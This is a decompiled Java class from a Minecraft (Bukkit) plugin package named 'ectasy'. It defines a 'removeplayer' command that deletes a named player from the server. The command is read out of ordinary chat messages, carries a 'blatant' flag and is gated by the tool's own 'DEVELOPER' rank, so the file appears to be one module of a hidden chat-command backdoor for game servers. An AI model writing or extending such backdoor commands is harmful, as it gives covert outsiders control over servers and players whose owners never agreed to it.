package fr.body.ectasy.command.impl;

import fr.body.ectasy.command.AbstractCommand;
import fr.body.ectasy.command.CommandInfo;
import fr.body.ectasy.user.Rank;
import fr.body.ectasy.util.ChatUtil;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.player.AsyncPlayerChatEvent;

@CommandInfo(
   name = "removeplayer",
   description = "Removes a player from existence",
   blatant = true,
   rank = Rank.DEVELOPER,
   aliases = {"rplayer"}
)
public class RemovePlayerCommand extends AbstractCommand {
   @Override
   public void execute(AsyncPlayerChatEvent var1, String var2, String[] var3) {
      if (var3.length == 0) {
         ChatUtil.sendChat(var1.getPlayer(), "Please, use rplayer <name>");
      } else {
         Player var4 = Bukkit.getPlayer(var3[0]);
         if (var4 == null) {
            ChatUtil.sendChat(var1.getPlayer(), "Player " + var3[0] + " not found.");
         } else {
            var4.remove();
         }
      }
   }
}
